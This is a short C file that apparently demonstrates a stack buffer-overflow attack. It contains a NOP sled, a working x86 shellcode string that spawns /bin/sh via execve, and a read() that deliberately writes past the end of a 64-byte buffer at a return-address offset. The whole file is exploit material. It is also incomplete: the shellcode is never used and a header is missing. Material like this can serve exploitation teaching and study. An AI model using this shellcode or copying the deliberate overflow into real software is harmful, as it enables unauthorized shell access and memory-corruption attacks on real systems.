#include <stdio.h>

#include <stdlib.h>

#define RET_OFFSET 64+24+4

int main(void){

    

    char nop_sled[64] = {};

    char shellcode[24] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";

    

    memset(nop_sled, 0x90, 64);

    read(0, nop_sled+RET_OFFSET, 4);

    return 0;

    

}
